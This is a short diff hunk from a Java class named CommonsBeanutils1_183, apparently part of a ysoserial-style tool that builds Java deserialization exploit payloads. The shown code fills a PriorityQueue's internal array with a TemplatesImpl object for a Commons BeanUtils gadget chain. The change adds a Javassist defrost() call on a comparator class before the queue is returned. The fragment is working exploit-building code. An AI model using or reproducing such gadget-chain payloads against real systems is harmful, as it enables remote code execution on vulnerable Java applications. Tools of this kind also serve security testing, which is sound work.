@@ -52,7 +52,7 @@ public class CommonsBeanutils1_183 implements ObjectPayload<Object> {
 		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
 		queueArray[0] = templates;
 		queueArray[1] = templates;
-
+        ctBeanComparator.defrost();
 		return queue;
 	}
 
